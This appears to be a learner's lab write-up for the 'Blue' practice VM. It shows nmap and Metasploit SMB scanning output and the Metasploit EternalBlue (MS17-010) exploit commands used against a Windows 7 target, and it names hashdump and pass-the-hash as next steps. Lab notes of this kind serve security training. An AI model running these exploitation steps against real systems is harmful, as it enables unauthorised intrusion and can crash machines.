**Blue**

<br/>
Victim IP - 192.168.247.130<br/>
<br/>
<br/>
Attacker Kali linux 2021<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
Passive recon N/A - target is an exploitable VM<br/>
<br/>
<br/>
arpscan confirm victim IP<br/>
<br/>
<img height="181" src="image.png" width="650"/><br/>
<br/>
<br/>
└─$ nmap -T4 -p- -A 192.168.247.130 <br/>
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-31 20:41 EST<br/>
Nmap scan report for 192.168.247.130<br/>
Host is up (0.00016s latency).<br/>
Not shown: 65526 closed tcp ports (conn-refused)<br/>
PORT   STATE SERVICE   VERSION<br/>
135/tcp  open msrpc    Microsoft Windows RPC<br/>
139/tcp  open netbios-ssn Microsoft Windows netbios-ssn<br/>
445/tcp  open microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)<br/>
49152/tcp open msrpc    Microsoft Windows RPC<br/>
49153/tcp open msrpc    Microsoft Windows RPC<br/>
49154/tcp open msrpc    Microsoft Windows RPC<br/>
49155/tcp open msrpc    Microsoft Windows RPC<br/>
49156/tcp open msrpc    Microsoft Windows RPC<br/>
49157/tcp open msrpc    Microsoft Windows RPC<br/>
Service Info: Host: WIN-845Q99OO4PP; OS: Windows; CPE: cpe:/o:microsoft:windows<br/>
<br/>
Host script results:<br/>
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s<br/>
| smb2-security-mode: <br/>
|  2.1: <br/>
|_  Message signing enabled but not required<br/>
|_nbstat: NetBIOS name: WIN-845Q99OO4PP, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:28:81:34 (VMware)<br/>
| smb2-time: <br/>
|  date: 2022-02-01T01:43:40<br/>
|_ start_date: 2022-02-01T15:31:04<br/>
| smb-security-mode: <br/>
|  account_used: guest<br/>
|  authentication_level: user<br/>
|  challenge_response: supported<br/>
|_ message_signing: disabled (dangerous, but default)<br/>
| smb-os-discovery: <br/>
|  OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)<br/>
|  OS CPE: cpe:/o:microsoft:windows_7::sp1<br/>
|  Computer name: WIN-845Q99OO4PP<br/>
|  NetBIOS computer name: WIN-845Q99OO4PP\x00<br/>
|  Workgroup: WORKGROUP\x00<br/>
|_ System time: 2022-01-31T20:43:40-05:00<br/>
<br/>
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>
Nmap done: 1 IP address (1 host up) scanned in 152.95 seconds<br/>
<br/>
<br/>
ENUMERATION/RESEARCH<br/>
<br/>
135/tcp  open msrpc    Microsoft Windows RPC<br/>
<br/>
Windows 7 Ultimate 7601 Service Pack 1<br/>
google &gt;&gt;&gt; eternal blue<br/>
<br/>
139/tcp  open netbios-ssn Microsoft Windows netbios-ssn<br/>
metasploit &gt; serach smb version.<br/>
auxiliary(scanner/smb/smb_version) &gt;<br/>
<br/>
set RHOSTS 192.168.247.130 <br/>
<br/>
exploit<br/>
<br/>
msf6 auxiliary(scanner/smb/smb_version) &gt; exploit<br/>
<br/>
[*] 192.168.247.130:445  - SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional) (uptime:) (guid:{601bf57b-fb90-451d-aae6-2b24df0c6a76}) (authentication domain:WIN-845Q99OO4PP)<br/>
[+] 192.168.247.130:445  -  Host is running Windows 7 Ultimate SP1 (build:7601) (name:WIN-845Q99OO4PP)<br/>
[*] 192.168.247.130:   - Scanned 1 of 1 hosts (100% complete)<br/>
[*] Auxiliary module execution completed<br/>
msf6 auxiliary(scanner/smb/smb_version) &gt; <br/>
<br/>
<br/>
<br/>
<br/>
445/tcp  open microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)<br/>
<br/>
metasploit &gt; serach smb version.<br/>
auxiliary(scanner/smb/smb_version) &gt;<br/>
<br/>
set RHOSTS 192.168.247.130 <br/>
<br/>
exploit<br/>
<br/>
msf6 auxiliary(scanner/smb/smb_version) &gt; exploit<br/>
<br/>
[*] 192.168.247.130:445  - SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional) (uptime:) (guid:{601bf57b-fb90-451d-aae6-2b24df0c6a76}) (authentication domain:WIN-845Q99OO4PP)<br/>
[+] 192.168.247.130:445  -  Host is running Windows 7 Ultimate SP1 (build:7601) (name:WIN-845Q99OO4PP)<br/>
[*] 192.168.247.130:   - Scanned 1 of 1 hosts (100% complete)<br/>
[*] Auxiliary module execution completed<br/>
msf6 auxiliary(scanner/smb/smb_version) &gt; <br/>
<br/>
<br/>
Lots of SMB related ports (also box callled blue) will continue research into SMB<br/>
<br/>
Google search &gt; SMB 2.1 exploit<br/>
<br/>
https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/<br/>
<br/>
rapid 7 eternal blue<br/>
<br/>
Numerous articles about wana cry/eternal blue and port 445<br/>
<br/>
EXPLOPITATION<br/>
<br/>
Eternal blue (name is a dead giveaway) is the key.<br/>
<br/>
Following steps on rapid7 or search smb ms17_010<br/>
msf &gt; use exploit/windows/smb/ms17_010_eternalblue<br/>
msf exploit(ms17_010_eternalblue) &gt; show targets<br/>
  ...targets...<br/>
msf exploit(ms17_010_eternalblue) &gt; set TARGET &lt; target-id &gt;<br/>
msf exploit(ms17_010_eternalblue) &gt; show options<br/>
  ...show and set options...<br/>
msf exploit(ms17_010_eternalblue) &gt; exploit<br/>
<br/>
Check options<br/>
<br/>
set RHOSTS to victim IP<br/>
<br/>
exlpoit &gt;&gt;&gt; if failed try again or check options and change the payload<br/>
!system crash! Apparently exploit can cause system crash.<br/>
On some systems, this module may cause system instability and crashes, such as a BSOD or a reboot. This may be more likely with some payloads. <br/>
<br/>
<img src="image 2.png"/><br/>
<br/>
<br/>
<br/>
<br/>
From here hashdump and crack or try pass the hash. This will be covered later in content.<br/>
<br/>
Notes &gt; manual methods are valible to try.. search github, check starts, guides and reviews to find a good exploit. Folow the instructions<br/>
NOTE &gt; this can dos a machine. always be sure before running it. in a live test this could be a critical machine. ask first.<br/>
<br/>
<br/>
